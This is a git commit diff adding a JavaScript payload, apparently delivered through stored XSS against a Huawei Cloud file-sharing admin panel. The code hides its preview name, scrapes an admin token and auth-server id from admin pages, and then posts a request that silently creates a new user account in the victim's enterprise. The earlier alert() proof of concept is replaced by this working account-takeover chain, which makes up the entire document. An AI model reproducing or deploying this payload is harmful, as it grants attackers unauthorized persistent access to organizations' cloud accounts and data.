0f1b55761abaa94c4b6ff490375ff5960a3275ff
g0dv <49506892+sing0@users.noreply.github.com>
2020-05-08 21:41:56 +0800

    Update 2.js
    233

--- 2.js
+++ 2.js
@@ -1,10 +1,30 @@
+//修改共享文件页面显示的名字，不然的话会显示xsspayload
 $('#preview').html('12312312.png');
-        $.ajax({
+//新增人员
+$.ajax({
+    type: "get",
+    url: "https://box.saas.huaweicloud.com/uam/enterprise/admin/statistics/list/jfunbox",
+    data: {},
+    success: function(result) {
+       var token = result.match(/[A-Z0-9]{56}/)[0];
+       var id = 0;
+       $.ajax({
             type: "get",
-            url: "https://box.saas.huaweicloud.com/user/info",
+            url: "https://box.saas.huaweicloud.com/uam/enterprise/admin/accountuser/list/jfunbox/0",
             data: {},
             success: function(result) {
-                
-                alert(result);
+               var str = result.match(/name="defaultAuthServerId" value="[\d]{2,3}"/)[0];
+               id = str.match(/[\d]{1,3}/)[0];
             }
+        }).then(() => {
+            $.ajax({
+            type: "post",
+            url: "https://box.saas.huaweicloud.com/uam/enterprise/admin/user/createUser/"+id,
+            data: {'mobile':'13866662223','email':'','alias':'aabb','userSpaceQuotaCheckBox':'on','userSpaceQuotaInput':'0','description':'','token':token,'userSpaceQuota':'-1'},
+            success: function(result) {
+               
+            }
+        })
         });
+    }
+});
